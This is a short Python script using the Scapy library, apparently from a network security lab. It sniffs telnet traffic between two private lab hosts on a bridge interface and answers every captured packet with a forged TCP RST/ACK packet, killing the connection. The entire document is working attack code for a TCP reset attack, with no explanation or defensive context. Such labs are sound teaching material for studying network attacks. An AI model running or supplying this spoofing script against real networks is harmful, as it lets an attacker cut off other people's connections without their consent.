from scapy.all import *

host1 = "10.9.0.5"
host2 = "10.9.0.6"
dstPORT = "23"
interface = "br-08174a224f46"

def do_rst(pkt):
	ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
	tcp = TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport,flags=0x14, seq=pkt[TCP].ack, ack=pkt[TCP].seq+1) # 0x14 = 20 --> RST/ACK
	pkt = ip/tcp
	send(pkt,verbose=0)
sniff(iface=interface, filter='host ' + host1 + ' and host ' + host2 + ' and port ' + dstPORT, prn=do_rst)
